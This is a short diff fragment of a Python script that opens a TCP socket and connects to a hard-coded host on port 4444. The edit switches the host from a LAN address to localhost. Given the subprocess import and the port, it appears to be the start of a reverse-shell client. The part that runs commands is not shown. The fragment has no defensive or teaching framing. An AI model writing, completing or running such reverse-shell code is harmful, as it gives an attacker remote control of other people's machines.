@@ -2,7 +2,7 @@ import socket
 import os
 import subprocess as sb
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-h="192.168.1.5"
+h="127.0.0.1"
 p=4444
 e="utf-8"
 s.connect((h,p))
